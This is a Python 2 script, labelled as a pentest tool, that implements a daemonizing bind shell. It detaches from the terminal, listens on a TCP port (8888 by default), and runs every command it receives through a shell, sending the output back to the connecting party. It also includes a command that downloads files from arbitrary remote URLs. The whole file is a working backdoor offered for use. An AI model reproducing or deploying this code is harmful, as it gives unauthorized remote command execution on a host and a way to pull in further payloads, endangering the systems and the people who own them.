#!/usr/bin/env python


#**************************************************************************#
#  Filename: py_bind_shel.py            (Created: 2016-08-14)              #
#                                       (Updated: 2016-10-02)              #
#  Info:                                                                   #
#    TBG Security Python BIND Shell for pentest                            #
#  Author:                                                                 #
#    Ryan Hays                                                             #
#**************************************************************************#


import os
import socket
import subprocess
import sys
import thread
import urllib2


UMASK = 0
WORKDIR = "/"
MAXFD = 1024

if hasattr(os, "devnull"):
    REDIRECT_TO = os.devnull
else:
    REDIRECT_TO = "/dev/null"


def createdaemon():
    try:
        pid = os.fork()
    except OSError, e:
        raise Exception, "%s [%d]" % (e.strerror, e.errno)

    if pid == 0:  # The first child.
        os.setsid()
        try:
            pid = os.fork()  # Fork a second child.
        except OSError, e:
            raise Exception, "%s [%d]" % (e.strerror, e.errno)

        if pid == 0:  # The second child.
            os.chdir(WORKDIR)
            os.umask(UMASK)
        else:
            os._exit(0)  # Exit parent (the first child) of the second child.
    else:
        os._exit(0)  # Exit parent of the first child.

    import resource  # Resource usage information.
    maxfd = resource.getrlimit(resource.RLIMIT_NOFILE)[1]
    if maxfd == resource.RLIM_INFINITY:
        maxfd = MAXFD

    for fd in range(0, maxfd):
        try:
            os.close(fd)
        except OSError:  # ERROR, fd wasn't open to begin with (ignored)
            pass
    os.open(REDIRECT_TO, os.O_RDWR)  # standard input (0)
    os.dup2(0, 1)  # standard output (1)
    os.dup2(0, 2)  # standard error (2)

    return (0)


def connection(conn):
    conn.setblocking(1)
    conn.send('Connection Established!')
    while True:
            conn.send('\n$')
            data = conn.recv(1024)

            if data.strip('\r\n') == 'quit' or data.strip('\r\n') == 'exit':
                    conn.close()
                    break
            elif data.strip('\r\n').startswith('cd'):
                    try:
                            os.chdir(data.strip('\r\n')[3:])
                    except:
                            conn.send('The system path cannot be found!')
            elif data.strip('\r\n').startswith('wget'):
                    try:
                            f = open(os.path.basename(data[5:]), "wb")
                            f.write(urllib2.urlopen(data[5:]))
                            f.close()
                            conn.send("Successfully downloaded %s" % os.path.basename(data[5:]))
                    except:
                            conn.send("Download failed!")
            else:
                    proc = subprocess.Popen(data.strip('\r\n'), shell=True, stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    stdoutput = proc.stdout.read() + proc.stderr.read()
                    conn.send(stdoutput)

if __name__ == "__main__":
    retCode = createdaemon()

    procParams = """
   return code = %s
   process ID = %s
   parent process ID = %s
   process group ID = %s
   session ID = %s
   user ID = %s
   effective user ID = %s
   real group ID = %s
   effective group ID = %s
   """ % (retCode, os.getpid(), os.getppid(), os.getpgrp(), os.getsid(0),
          os.getuid(), os.geteuid(), os.getgid(), os.getegid())

    while True:
        try:
                s = socket.socket()
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

                try:
                    s.bind(('', int(sys.argv[1])))
                except IndexError:
                    s.bind(('', 8888))
                s.listen(5)

                while True:
                        s.settimeout(2)
                        try:
                                conn, addr = s.accept()

                        except socket.timeout:
                                continue

                        if (conn):
                                s.settimeout(None)
                                thread.start_new_thread(connection, (conn,))
        except:
                pass

    sys.exit(retCode)